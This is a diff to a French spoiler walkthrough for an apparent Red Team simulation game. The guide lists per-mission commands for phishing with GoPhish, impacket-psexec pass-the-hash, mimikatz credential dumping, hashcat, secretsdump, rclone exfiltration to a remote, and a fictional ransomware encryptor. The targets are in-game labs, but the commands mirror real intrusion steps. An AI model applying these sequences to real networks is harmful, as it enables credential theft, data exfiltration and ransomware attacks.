@@ -1,4 +1,4 @@
-# Guide complet et cheat sheet — campagne solo Red Team
+# Guide complet et cheat sheet - campagne solo Red Team
 
 État vérifié le 11 novembre 2026. **Spoilers complets** : ce document révèle les identifiants fictifs et les solutions du jeu.
 
@@ -16,11 +16,11 @@ ci-dessous restent ceux de la campagne prototype.
 1. **Hashcat et mots de passe** : remplacer le petit dictionnaire de démonstration par un vrai jeu de données, ajouter règles et masques, calculer le travail effectué et les durées selon l'algorithme et des benchmarks vérifiés de RTX 5090. Aujourd'hui, `rockyou.txt` contient huit mots fictifs de démonstration ; le modèle couvre NTLM/dictionnaire et 4 096 entrées maximum. Aucun hashrate 5090 réaliste n'est encore implémenté.
 2. **Plusieurs chemins d'accès** : les six scénarios réutilisent beaucoup le schéma campagne → poste accueil → mémoire → compte technique. Ajouter des entrées et objectifs réellement différents, des droits plus fins et de plus grandes topologies. Un chemin alternatif doit se découvrir par des indices.
 3. **Protections plus riches** : les politiques EDR actuelles sont audit/blocage sur trois actions ; les règles réseau distinguent origine/destination/port. Il manque les processus détaillés, les périmètres de collecte et des outils de pivot réellement modélisés. LabEndpoint est une protection fictive, pas la reproduction d'un produit commercial.
-4. **Communautés et incidents** : prolonger les fils écrits en dossiers interactifs — preuves de vendeurs, litiges, passations, décisions des interlocuteurs et négociation. Une annonce, une demande de rançon, un transfert de document, une publication et un paiement doivent conserver des états séparés.
+4. **Communautés et incidents** : prolonger les fils écrits en dossiers interactifs - preuves de vendeurs, litiges, passations, décisions des interlocuteurs et négociation. Une annonce, une demande de rançon, un transfert de document, une publication et un paiement doivent conserver des états séparés.
 5. **Accueil et sauvegardes** : menu et emplacements désormais implémentés. Restent le nom définitif, les miniatures, la disposition exacte des fenêtres et la validation des paquets sur les systèmes cibles. Voir SAUVEGARDES.md.
 6. **Progression** : stabiliser et faire tester le solo Red Team ; développer ensuite un vrai rôle Blue Team ; seulement ensuite le multijoueur avec serveur autoritaire, vues séparées et reconnexion. Ces deux modes ne sont pas livrés aujourd'hui.
 
-## Portefeuille et accès — version 0.4.1
+## Portefeuille et accès - version 0.4.1
 
 Les fonds sont désormais dans l’application ColdVault du bureau, pas sur les
 forums. Pour un achat payant : choisir l’article dans la boutique, connecter et
@@ -33,14 +33,14 @@ réputation de la communauté précédente. Voir [PORTEFEUILLE_ET_ACCES.md](PORT
 
 - Une commande à la fois, puis Entrée. Attendre le résultat de l'action avant la suivante ; ne pas coller un bloc entier comme un script.
 - Ouvrir plusieurs terminaux avec Ctrl+Alt+T ou le menu Terminal. Les noms ci-dessous sont des **rôles**, pas des numéros imposés par le jeu.
-- **Kali principal** : reconnaissance, API GoPhish, Hashcat, clients Impacket. **Kali — transferts** : SMB/SCP. Garder ces consoles locales.
-- **Kali — serveur GoPhish** : lancer le serveur et laisser cette console ouverte. Ctrl+C l'arrête. Si le serveur tourne déjà dans une autre console, conserver cette console plutôt que lancer un deuxième serveur.
-- **Session Windows — poste accueil / serveur** : après impacket-psexec, les commandes suivantes dans cette console s'exécutent sur Windows. `whoami` doit afficher `nt authority\system` pour la lecture mémoire du parcours.
+- **Kali principal** : reconnaissance, API GoPhish, Hashcat, clients Impacket. **Kali - transferts** : SMB/SCP. Garder ces consoles locales.
+- **Kali - serveur GoPhish** : lancer le serveur et laisser cette console ouverte. Ctrl+C l'arrête. Si le serveur tourne déjà dans une autre console, conserver cette console plutôt que lancer un deuxième serveur.
+- **Session Windows - poste accueil / serveur** : après impacket-psexec, les commandes suivantes dans cette console s'exécutent sur Windows. `whoami` doit afficher `nt authority\system` pour la lecture mémoire du parcours.
 - Les commandes affichent les secrets de référence de nouvelles missions dans cette version. Comparer avec le résultat obtenu dans le jeu, surtout après modification de scénario ou reprise d'une ancienne sauvegarde.
 - Les réactions humaines ne sont pas garanties hors tutoriel. Un résultat `Queued` de curl indique la création d'une campagne, pas la récupération d'un mot de passe. Lire le résultat avant de continuer. Une absence de réponse ou un signalement n'est pas un succès ; répéter sans réfléchir augmente la suspicion. Les secrets révélés ici permettent de court-circuiter une étape : ce serait une solution avec spoilers, pas la preuve d'une collecte réussie.
 - Les missions ont un délai. Les essais automatisés accélèrent les ticks ; ils ne mesurent ni le temps de jeu humain ni une opération réelle.
 
-### Démarrer GoPhish si nécessaire — commun aux cinq premières missions
+### Démarrer GoPhish si nécessaire - commun aux cinq premières missions
 
 Dans une console Kali dédiée, avant les commandes curl :
 
@@ -68,7 +68,7 @@ Une mission est réussie quand le contrat passe à `SUCCESS`, avec objectifs vé
 
 | Ordre | Scénario | Réseau | Réputation minimale | Prime annoncée |
 |---|---|---|---:|---:|
-| 1 | Ravelle — tutoriel | 10.20.0.0/24 | 0 | 300 ₵ |
+| 1 | Ravelle - tutoriel | 10.20.0.0/24 | 0 | 300 ₵ |
 | 2 | Morel | 10.31.4.0/24 | 0 | 350 ₵, bonus possible 175 ₵ |
 | 3 | Atelier Dumas | 10.42.8.0/24 | 50 | 450 ₵ |
 | 4 | Varenne | 10.53.12.0/24 | 100 | 1 000 ₵ |
@@ -77,7 +77,7 @@ Une mission est réussie quand le contrat passe à `SUCCESS`, avec objectifs vé
 
 Six scénarios distincts, sept contrats avec Offre urgente.
 
-## 4. Tutoriel — Cabinet Ravelle & Associés
+## 4. Tutoriel - Cabinet Ravelle & Associés
 
 **Objectif :** Prendre une session administrateur sur le serveur de fichiers.
 
@@ -89,20 +89,20 @@ Six scénarios distincts, sept contrats avec Offre urgente.
 
 ### Commandes dans l’ordre
 
-**Étape 1 — Kali principal**
+**Étape 1 - Kali principal**
 
 ```text
 cat ~/mission/briefing.txt
 nmap -sV 10.20.0.0/24
 ```
 
-**Étape 2 — Kali — serveur GoPhish**
+**Étape 2 - Kali - serveur GoPhish**
 
 ```text
 gophish --config /opt/gophish/config.json
 ```
 
-**Étape 3 — Kali principal**
+**Étape 3 - Kali principal**
 
 ```text
 API_KEY=$(cat ~/gophish/api-key.txt)
@@ -112,7 +112,7 @@ curl -k -H "Authorization: $API_KEY" -H "Content-Type: application/json" -d @/ho
 
 Attendre le résultat de campagne et vérifier la présence du compte en clair dans le butin. Le lancement seul ne valide pas cette étape.
 
-**Étape 4 — Session Windows — poste accueil**
+**Étape 4 - Session Windows - poste accueil**
 
 ```text
 impacket-psexec m.leroux:Password123!@10.20.0.21
@@ -120,13 +120,13 @@ whoami
 dir C:\Data
 ```
 
-**Étape 5 — Kali — transferts**
+**Étape 5 - Kali - transferts**
 
 ```text
 smbclient '//10.20.0.21/C$' -U 'm.leroux%Password123!' -c 'put /home/operator/tools/mimikatz.exe Tools/mimikatz.exe'
 ```
 
-**Étape 6 — Session Windows — poste accueil**
+**Étape 6 - Session Windows - poste accueil**
 
 ```text
 C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
@@ -134,7 +134,7 @@ C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 
 Résultat attendu : les identifiants présents en mémoire apparaissent ; le fichier NTLM du compte technique est enregistré sous `~/loot/` pour les commandes locales suivantes. La console courante reste sur Windows.
 
-**Étape 7 — Session Windows — serveur documentaire**
+**Étape 7 - Session Windows - serveur documentaire**
 
 ```text
 impacket-psexec -hashes :ca61eb63ab385fa4039002a79909c534 it.presta@10.20.0.10
@@ -160,7 +160,7 @@ Parcours de référence : **SUCCESS**, **300 ₵**. Les 6 ticks de cet essai aut
 
 Vérifier d’abord que GoPhish tourne dans sa console dédiée ; sinon utiliser la commande commune ci-dessus.
 
-**Étape 1 — Kali principal**
+**Étape 1 - Kali principal**
 
 ```text
 cat ~/mission/briefing.txt
@@ -172,7 +172,7 @@ curl -k -H "Authorization: $API_KEY" -H "Content-Type: application/json" -d @/ho
 
 Attendre le résultat de campagne et vérifier la présence du compte en clair dans le butin. Le lancement seul ne valide pas cette étape.
 
-**Étape 2 — Session Windows — poste accueil**
+**Étape 2 - Session Windows - poste accueil**
 
 ```text
 impacket-psexec a.morel:Password123!@10.31.4.21
@@ -180,13 +180,13 @@ whoami
 dir C:\Data
 ```
 
-**Étape 3 — Kali — transferts**
+**Étape 3 - Kali - transferts**
 
 ```text
 smbclient '//10.31.4.21/C$' -U 'a.morel%Password123!' -c 'put /home/operator/tools/mimikatz.exe Tools/mimikatz.exe'
 ```
 
-**Étape 4 — Session Windows — poste accueil**
+**Étape 4 - Session Windows - poste accueil**
 
 ```text
 C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
@@ -194,7 +194,7 @@ C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 
 Résultat attendu : les identifiants présents en mémoire apparaissent ; le fichier NTLM du compte technique est enregistré sous `~/loot/` pour les commandes locales suivantes. La console courante reste sur Windows.
 
-**Étape 5 — Kali principal**
+**Étape 5 - Kali principal**
 
 ```text
 hashcat -m 1000 ~/loot/support.morel.ntlm /usr/share/wordlists/rockyou.txt
@@ -202,19 +202,19 @@ hashcat -m 1000 ~/loot/support.morel.ntlm /usr/share/wordlists/rockyou.txt
 
 Attendre `Cracked` et le mot de passe. Si le résultat est `Exhausted`, vérifier le fichier et les candidats : ce n’est pas une réussite.
 
-**Étape 6 — Session Windows — serveur documentaire**
+**Étape 6 - Session Windows - serveur documentaire**
 
 ```text
 impacket-psexec support.morel:Morel2026!@10.31.4.10
 ```
 
-**Étape 7 — Kali — transferts**
+**Étape 7 - Kali - transferts**
 
 ```text
 smbclient '//10.31.4.10/C$' -U 'support.morel%Morel2026!' -c 'put /home/operator/tools/rclone.exe Tools/rclone.exe'
 ```
 
-**Étape 8 — Session Windows — serveur documentaire**
+**Étape 8 - Session Windows - serveur documentaire**
 
 ```text
 rclone copy C:\Data remote:loot
@@ -230,7 +230,7 @@ Parcours de référence : **SUCCESS**, **350 ₵**. Les 21 ticks de cet essai au
 
 Le parcours touche 350 ₵, pas 525 ₵ : la lecture mémoire a produit une alerte critique. Pour un transfert limité au document demandé, voir la variante SMB en annexe.
 
-## 6. Un concurrent jaloux — Atelier Dumas
+## 6. Un concurrent jaloux - Atelier Dumas
 
 **Objectif :** Retrouver le mot de passe en clair de maintenance.dumas.
 
@@ -244,7 +244,7 @@ Le parcours touche 350 ₵, pas 525 ₵ : la lecture mémoire a produit une aler
 
 Vérifier d’abord que GoPhish tourne dans sa console dédiée ; sinon utiliser la commande commune ci-dessus.
 
-**Étape 1 — Kali principal**
+**Étape 1 - Kali principal**
 
 ```text
 cat ~/mission/briefing.txt
@@ -256,7 +256,7 @@ curl -k -H "Authorization: $API_KEY" -H "Content-Type: application/json" -d @/ho
 
 Attendre le résultat de campagne et vérifier la présence du compte en clair dans le butin. Le lancement seul ne valide pas cette étape.
 
-**Étape 2 — Session Windows — poste accueil**
+**Étape 2 - Session Windows - poste accueil**
 
 ```text
 impacket-psexec l.dumas:Password123!@10.42.8.21
@@ -264,13 +264,13 @@ whoami
 dir C:\Data
 ```
 
-**Étape 3 — Kali — transferts**
+**Étape 3 - Kali - transferts**
 
 ```text
 smbclient '//10.42.8.21/C$' -U 'l.dumas%Password123!' -c 'put /home/operator/tools/mimikatz.exe Tools/mimikatz.exe'
 ```
 
-**Étape 4 — Session Windows — poste accueil**
+**Étape 4 - Session Windows - poste accueil**
 
 ```text
 C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
@@ -278,7 +278,7 @@ C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 
 Résultat attendu : les identifiants présents en mémoire apparaissent ; le fichier NTLM du compte technique est enregistré sous `~/loot/` pour les commandes locales suivantes. La console courante reste sur Windows.
 
-**Étape 5 — Kali principal**
+**Étape 5 - Kali principal**
 
 ```text
 hashcat -m 1000 ~/loot/maintenance.dumas.ntlm /usr/share/wordlists/rockyou.txt
@@ -306,7 +306,7 @@ Parcours de référence : **SUCCESS**, **450 ₵**. Les 21 ticks de cet essai au
 
 Vérifier d’abord que GoPhish tourne dans sa console dédiée ; sinon utiliser la commande commune ci-dessus.
 
-**Étape 1 — Kali principal**
+**Étape 1 - Kali principal**
 
 ```text
 cat ~/mission/briefing.txt
@@ -318,7 +318,7 @@ curl -k -H "Authorization: $API_KEY" -H "Content-Type: application/json" -d @/ho
 
 Attendre le résultat de campagne et vérifier la présence du compte en clair dans le butin. Le lancement seul ne valide pas cette étape.
 
-**Étape 2 — Session Windows — poste accueil**
+**Étape 2 - Session Windows - poste accueil**
 
 ```text
 impacket-psexec p.varenne:Varenne-Accueil!2026@10.53.12.21
@@ -326,13 +326,13 @@ whoami
 dir C:\Data
 ```
 
-**Étape 3 — Kali — transferts**
+**Étape 3 - Kali - transferts**
 
 ```text
 smbclient '//10.53.12.21/C$' -U 'p.varenne%Varenne-Accueil!2026' -c 'put /home/operator/tools/mimikatz.exe Tools/mimikatz.exe'
 ```
 
-**Étape 4 — Session Windows — poste accueil**
+**Étape 4 - Session Windows - poste accueil**
 
 ```text
 C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
@@ -340,7 +340,7 @@ C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 
 Résultat attendu : les identifiants présents en mémoire apparaissent ; le fichier NTLM du compte technique est enregistré sous `~/loot/` pour les commandes locales suivantes. La console courante reste sur Windows.
 
-**Étape 5 — Kali principal → session Windows après la dernière commande**
+**Étape 5 - Kali principal → session Windows après la dernière commande**
 
 ```text
 impacket-secretsdump -just-dc -hashes :c2661f0d9475882ba50b9721597a92c7 svc.replic@10.53.12.10
@@ -356,7 +356,7 @@ La connexion avec le ticket est acceptée et domain_compromised devient vrai. Cr
 
 Parcours de référence : **SUCCESS**, **1000 ₵**. Les 23 ticks de cet essai automatisé ne sont pas une estimation de durée humaine.
 
-## 8. Première affiliation — Imprimerie Belin
+## 8. Première affiliation - Imprimerie Belin
 
 **Objectif :** Atteindre au moins 60 % de machines chiffrées dans le laboratoire.
 
@@ -370,7 +370,7 @@ Parcours de référence : **SUCCESS**, **1000 ₵**. Les 23 ticks de cet essai a
 
 Vérifier d’abord que GoPhish tourne dans sa console dédiée ; sinon utiliser la commande commune ci-dessus.
 
-**Étape 1 — Kali principal**
+**Étape 1 - Kali principal**
 
 ```text
 cat ~/mission/briefing.txt
@@ -382,7 +382,7 @@ curl -k -H "Authorization: $API_KEY" -H "Content-Type: application/json" -d @/ho
 
 Attendre le résultat de campagne et vérifier la présence du compte en clair dans le butin. Le lancement seul ne valide pas cette étape.
 
-**Étape 2 — Session Windows — poste accueil**
+**Étape 2 - Session Windows - poste accueil**
 
 ```text
 impacket-psexec j.belin:Imprimerie-Accueil!2026@10.64.16.21
@@ -390,13 +390,13 @@ whoami
 dir C:\Data
 ```
 
-**Étape 3 — Kali — transferts**
+**Étape 3 - Kali - transferts**
 
 ```text
 smbclient '//10.64.16.21/C$' -U 'j.belin%Imprimerie-Accueil!2026' -c 'put /home/operator/tools/mimikatz.exe Tools/mimikatz.exe'
 ```
 
-**Étape 4 — Session Windows — poste accueil**
+**Étape 4 - Session Windows - poste accueil**
 
 ```text
 C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
@@ -404,21 +404,21 @@ C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 
 Résultat attendu : les identifiants présents en mémoire apparaissent ; le fichier NTLM du compte technique est enregistré sous `~/loot/` pour les commandes locales suivantes. La console courante reste sur Windows.
 
-**Étape 5 — Kali — transferts**
+**Étape 5 - Kali - transferts**
 
 ```text
 smbclient '//10.64.16.21/C$' -U 'j.belin%Imprimerie-Accueil!2026' -c 'put /home/operator/tools/vesper.exe Tools/vesper.exe'
 smbclient '//10.64.16.10/C$' -U svc.belin%06b78af97e25f97772169211821b24ff --pw-nt-hash -c 'put /home/operator/tools/vesper.exe Tools/vesper.exe'
 ```
 
-**Étape 6 — Session Windows — première cible**
+**Étape 6 - Session Windows - première cible**
 
 ```text
 impacket-psexec j.belin:Imprimerie-Accueil!2026@10.64.16.21
 vesper encrypt
 ```
 
-**Étape 7 — Session Windows — serveur documentaire**
+**Étape 7 - Session Windows - serveur documentaire**
 
 ```text
 impacket-psexec -hashes :06b78af97e25f97772169211821b24ff svc.belin@10.64.16.10
@@ -431,7 +431,7 @@ Au moins deux machines sur trois portent l’état chiffré. Une exfiltration n�
 
 Parcours de référence : **SUCCESS**, **157 ₵**. Les 23 ticks de cet essai automatisé ne sont pas une estimation de durée humaine.
 
-## 9. Grand compte — Groupe Valmont
+## 9. Grand compte - Groupe Valmont
 
 **Objectif :** Transférer archive.zip, retirer les instantanés locaux du serveur et chiffrer au moins 60 % des machines.
 
@@ -445,7 +445,7 @@ Parcours de référence : **SUCCESS**, **157 ₵**. Les 23 ticks de cet essai au
 
 La première commande `exit` quitte la session Windows fournie. La saisir seulement si cette console est effectivement sur Windows ; depuis une nouvelle console Kali, commencer directement au briefing. Les identifiants de la passation sont aussi lisibles avec `cat ~/mission/acces.txt`.
 
-**Étape 1 — Kali principal**
+**Étape 1 - Kali principal**
 
 ```text
 exit
@@ -453,33 +453,33 @@ cat ~/mission/briefing.txt
 nmap -sV 10.75.20.0/24
 ```
 
-**Étape 2 — Kali — transferts**
+**Étape 2 - Kali - transferts**
 
 ```text
 smbclient '//10.75.20.21/C$' -U 'support.valmont%Valmont2026!' -c 'put /home/operator/tools/vesper.exe Tools/vesper.exe'
 smbclient '//10.75.20.10/C$' -U 'support.valmont%Valmont2026!' -c 'put /home/operator/tools/vesper.exe Tools/vesper.exe'
 ```
 
-**Étape 3 — Session Windows — première cible**
+**Étape 3 - Session Windows - première cible**
 
 ```text
 impacket-psexec support.valmont:Valmont2026!@10.75.20.21
 vesper encrypt
 ```
 
-**Étape 4 — Session Windows — serveur documentaire**
+**Étape 4 - Session Windows - serveur documentaire**
 
 ```text
 impacket-psexec support.valmont:Valmont2026!@10.75.20.10
 ```
 
-**Étape 5 — Kali — transferts**
+**Étape 5 - Kali - transferts**
 
 ```text
 smbclient '//10.75.20.10/C$' -U 'support.valmont%Valmont2026!' -c 'put /home/operator/tools/rclone.exe Tools/rclone.exe'
 ```
 
-**Étape 6 — Session Windows — serveur documentaire**
+**Étape 6 - Session Windows - serveur documentaire**
 
 ```text
 rclone copy C:\Data remote:loot
@@ -497,7 +497,7 @@ Parcours de référence : **SUCCESS**, **4025 ₵**. Les 14 ticks de cet essai a
 
 Le parcours touche 4 025 ₵ : base 3 500, instantanés du serveur retirés et exfiltration donnant le multiplicateur du jeu de 115 %. Ce chiffre est le règlement du contrat, pas une rançon versée par Valmont.
 
-## 10. Contrat optionnel — Offre urgente
+## 10. Contrat optionnel - Offre urgente
 
 Ce septième contrat réutilise le réseau Morel et le même objectif : transférer `contrats_2026.xlsx`. Le client a un compte très récent, une réputation nulle et demande d'agir sans fournir de références. Ce sont des éléments de contexte à examiner, pas la preuve qu'une réussite sera annulée.
 
@@ -509,7 +509,7 @@ Ce septième contrat réutilise le réseau Morel et le même objectif : transfé
 
 ## 11. Variantes et observations utiles
 
-### Copier seulement le fichier demandé — variante Morel testée
+### Copier seulement le fichier demandé - variante Morel testée
 
 Depuis Kali, après obtention du mot de passe support.morel et découverte du serveur :
 
@@ -519,7 +519,7 @@ smbclient //10.31.4.10/C$ -U 'support.morel%Morel2026!' -c 'get Data/contrats_20
 
 Cette variante remplace le transfert de rclone et sa copie de tout le dossier. Elle a été testée dans le second parcours. Elle n'efface pas les alertes produites avant le transfert.
 
-### Transférer l'outil par SCP — variante tutoriel testée
+### Transférer l'outil par SCP - variante tutoriel testée
 
 Depuis une console Kali de transfert :
 
@@ -529,7 +529,7 @@ scp ~/tools/mimikatz.exe m.leroux@10.20.0.21:C:/Tools/mimikatz.exe
 
 Quand le terminal demande le mot de passe, saisir **Password123!** puis Entrée. Ce mot de passe répond à l'invite ; ce n'est pas une nouvelle commande système.
 
-### PowerShell — variante testée
+### PowerShell - variante testée
 
 Dans la session Windows distante, ouvrir PowerShell :
 
@@ -539,7 +539,7 @@ powershell -NoLogo -NoProfile
 
 Les commandes Windows du parcours se saisissent ensuite dans cette console ; `exit` revient au shell précédent. Le sous-ensemble du jeu n'exécute pas des scripts PowerShell arbitraires.
 
-### Comprendre les protections — exploration facultative, pas une étape obligatoire
+### Comprendre les protections - exploration facultative, pas une étape obligatoire
 
 Dans une session Windows du poste d'accueil, ouvrir PowerShell puis lire :
 
@@ -605,7 +605,7 @@ Les commandes d'observation de protection sont couvertes par les tests dédiés 
 Références locales : [contrat du terminal](COMMANDES.md), [réalisme et limites](REALISME.md), [vérifications](VERIFICATION.md), [plan du projet](ROADMAP.md).
 
 
-## Nouveau dossier privé — chapitre 08
+## Nouveau dossier privé - chapitre 08
 
 [Mauvaise adresse : enquête, commandes et livraison](CHAPITRE_08.md).
 Disponible dans Chordly auprès de nullroute après Morel ; absent du tableau public.
